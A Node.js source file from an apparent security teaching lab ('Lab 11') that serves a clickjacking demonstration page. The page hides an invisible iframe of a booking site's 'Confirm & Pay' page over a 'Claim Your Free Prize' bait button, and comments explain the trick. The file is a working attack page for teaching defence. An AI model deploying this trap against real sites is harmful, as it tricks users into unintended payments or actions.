// Attacker server — Lab 11 (http://localhost:5000)
// Serves the clickjack trap page that embeds the Camp Booking confirm page
// inside an invisible iframe positioned over a "Free Prize" button.

const http = require('http');

const TARGET = process.env.TARGET || 'http://localhost:3000';
const PORT = 5000;

const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <title>🎁 You won a free prize!</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: system-ui, sans-serif;
      background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .card {
      background: #fff;
      border-radius: 16px;
      padding: 40px 48px;
      box-shadow: 0 20px 60px rgba(0,0,0,.15);
      text-align: center;
      width: 360px;
      position: relative;
    }
    h1 { font-size: 1.6rem; color: #1f2937; margin-bottom: 8px; }
    p  { color: #6b7280; font-size: 14px; margin-bottom: 28px; }

    /* visible "bait" button */
    .bait-btn {
      width: 100%;
      padding: 16px;
      background: #f59e0b;
      color: #fff;
      border: none;
      border-radius: 10px;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      position: relative;   /* sits below the iframe in z-index */
      z-index: 1;
    }
    .bait-btn:hover { background: #d97706; }

    /*
      THE TRAP:
      The iframe loads the Camp Booking /confirm page.
      opacity:0 makes it invisible to the user.
      It is positioned exactly over the "Claim Prize" button.
      z-index:2 places it on top, so the browser registers
      the click on the iframe content, not the bait button.
    */
    .trap-frame {
      position: absolute;
      top: 116px;          /* align vertically over the bait button */
      left: 48px;
      width: 264px;        /* same width as the bait button */
      height: 56px;        /* same height as Confirm & Pay button */
      opacity: 0;          /* invisible — user cannot see it */
      z-index: 2;          /* on top of the bait button */
      border: none;
      pointer-events: all; /* receives mouse events */
    }

    .note {
      margin-top: 20px;
      font-size: 12px;
      color: #9ca3af;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>🎁 You Won!</h1>
    <p>Congratulations! You have been selected for a free prize.<br>Click below to claim it now.</p>

    <!-- Bait: what the user sees -->
    <button class="bait-btn">🎉 Claim Your Free Prize!</button>

    <!--
      TRAP: invisible iframe of Camp Booking /confirm page.
      The "Confirm & Pay" button inside is aligned over the bait button.
      When the user clicks "Claim Prize" they actually click "Confirm & Pay".
    -->
    <iframe
      class="trap-frame"
      src="${TARGET}/confirm"
      title="prize"
      sandbox="allow-forms allow-scripts allow-same-origin">
    </iframe>

    <p class="note">
      Lab 11 — Clickjacking demo.<br>
      Target: <code>${TARGET}/confirm</code>
    </p>
  </div>

  <div style="margin-top:24px;background:rgba(255,255,255,.7);border-radius:10px;padding:12px 20px;font-size:12px;color:#6b7280;max-width:360px;text-align:center">
    <strong>How it works:</strong> An invisible iframe (opacity:0, z-index:2) loads the
    target page and is layered over the "Claim Prize" button. The browser sees
    the click on the iframe, not the visible button.
  </div>
</body>
</html>`;

http.createServer((req, res) => {
  if (req.url === '/' || req.url === '/index.html') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(html);
  } else {
    res.writeHead(404); res.end('not found');
  }
}).listen(PORT, () => {
  console.log(`[Attacker] Clickjack trap running on http://localhost:${PORT}`);
  console.log(`[Attacker] Target: ${TARGET}/confirm`);
});
